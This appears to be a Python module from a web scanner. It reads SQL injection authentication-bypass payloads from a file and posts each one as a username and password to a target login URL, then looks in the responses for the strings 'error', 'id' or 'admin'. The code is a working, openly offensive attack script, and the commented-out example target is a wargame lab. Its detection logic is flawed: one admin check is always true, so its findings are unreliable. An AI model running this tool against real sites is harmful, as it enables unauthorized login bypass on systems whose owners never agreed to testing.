import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger


attack_type = "authentication bypass SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""




pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []


__priority__ = PRIORITY.MEDIUM
__harmfull__ = HARMFULL.HIGH



async def auth_SQL_inj(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            logger.info(sorted_payload)
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
                logger.info(f"The website:{urls} is returning 200 status code.\n\n")
                if ask.lower() == "y": 
                    for line in sorted_payload.split("\n"):
                        params = { 
                            "username": line,
                            "password": line
                        }
                        ack = requests.post(url=urls, data=params,verify=False) 
                        logger.info(f"Testing payload:{line}")
                        await asyncio.sleep(5) 
                        if "error" in ack.text: 
                            logger.info(f"Could find parameter Error,keyword:{line}")
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                        if vuln: 
                            logger.info(f"Could find ERROR parameter, keyword:{line}")
                            await asyncio.sleep(3) 
                            Detect(ack.text)
                        
                        if htmlVULN:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                        
                        word = "id" in req.text 
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find parameter id, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                        
                        if errword:
                            logger.info(f"Could find parameter error, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            
                        
                            
                    if req.status_code == 302: 
                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")
                        done = True
                    
                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                        Detect(ack.text)
                        
            else:
                logger.info(f"Host is down with the url: {urls}\n\n")
                
        
                        
                    
    except Exception as e:
        logger.error(f"Error: {e}")
    except KeyboardInterrupt:
        pass

    except SystemExit as syse:
        raise syse
        
        
  
        
    finally:
        pass
    

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
